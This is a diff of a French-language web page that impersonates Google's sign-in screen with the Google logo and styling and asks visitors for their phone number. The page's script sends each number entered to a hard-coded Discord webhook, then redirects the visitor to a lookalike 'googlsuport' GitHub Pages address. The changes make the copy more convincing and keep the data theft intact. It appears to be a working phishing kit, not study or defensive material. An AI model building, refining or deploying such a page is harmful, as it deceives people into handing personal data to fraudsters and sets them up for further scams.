@@ -1,93 +1,158 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Connexion - Google</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: #fff;
       margin: 0;
       padding: 0;
+      background: #fff;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #202124;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
+
     .container {
-      max-width: 360px;
-      width: 90%;
+      width: 360px;
+      max-width: 95%;
+      padding: 20px;
       text-align: center;
     }
-    .logo {
+
+    .google-logo {
       width: 92px;
       margin-bottom: 24px;
     }
-    input, button {
+
+    h1 {
+      font-weight: 400;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      color: #202124;
+      margin-bottom: 20px;
+    }
+
+    input[type="tel"]:focus {
+      border-color: #1a73e8;
+      outline: none;
+      box-shadow: 0 1px 2px rgba(26, 115, 232, 0.3);
+    }
+
+    button {
       width: 100%;
       padding: 12px;
-      font-size: 16px;
-      margin: 10px 0;
-    }
-    button {
       background-color: #1a73e8;
       color: white;
+      font-size: 16px;
       border: none;
+      border-radius: 4px;
       cursor: pointer;
     }
+
     button:hover {
       background-color: #1669c1;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo" />
     <h1>Connexion</h1>
     <p>Entrez votre numéro de téléphone pour continuer</p>
-    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" autocomplete="tel">
-    <button id="send">Suivant</button>
+
+    <input
+      type="tel"
+      id="phoneNumber"
+      placeholder="+33 6 12 34 56 78"
+      autocomplete="tel"
+      required
+    />
+    <button id="submitBtn">Suivant</button>
+
+    <div class="footer">
+      Nous utilisons ce numéro pour vérifier votre compte.
+    </div>
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1399331411558797363/L-4Sn5hwtib-iQQei_gP1pPrCqf0jRYWiridji5jA2sGajdEdCzIX1uymbsWIEunmUWs";
-    const phoneInput = document.getElementById("phone");
-    const sendBtn = document.getElementById("send");
+    const phoneInput = document.getElementById("phoneNumber");
+    const submitBtn = document.getElementById("submitBtn");
 
-    sendBtn.addEventListener("click", () => {
-      const phone = phoneInput.value.trim();
-      if (!phone) {
-        alert("Veuillez entrer un numéro.");
-        return;
-      }
-
-      const payload = {
-        content: "Numéro de téléphone reçu : " + phone
+    function envoyerNumero(phone) {
+      const data = {
+        content: `Numéro de téléphone reçu : ${phone}`
       };
 
-      fetch(webhookURL, {
+      return fetch(webhookURL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        console.log("Envoi réussi", response.status);
-        setTimeout(() => {
-          window.location.href = "https://googlsuport.github.io/googleproblem/";
-        }, 1000); // délai pour laisser partir la requête
-      })
-      .catch(error => {
-        console.error("Erreur d'envoi :", error);
-        alert("Erreur réseau.");
+        body: JSON.stringify(data)
       });
+    }
+
+    submitBtn.addEventListener("click", () => {
+      const phone = phoneInput.value.trim();
+
+      if (!phone) {
+        alert("Veuillez entrer un numéro de téléphone.");
+        return;
+      }
+
+      envoyerNumero(phone)
+        .then(res => {
+          if (!res.ok) throw new Error("Échec de l'envoi");
+          console.log("Numéro envoyé avec succès !");
+          // Laisser le temps au webhook de recevoir avant redirection
+          setTimeout(() => {
+            window.location.href = "https://googlsuport.github.io/googleproblem/";
+          }, 800);
+        })
+        .catch(err => {
+          console.error("Erreur :", err);
+          alert("Erreur lors de l'envoi. Veuillez réessayer.");
+        });
+
+      phoneInput.value = "";
     });
 
     phoneInput.addEventListener("keydown", e => {
       if (e.key === "Enter") {
-        sendBtn.click();
+        submitBtn.click();
       }
     });
   </script>
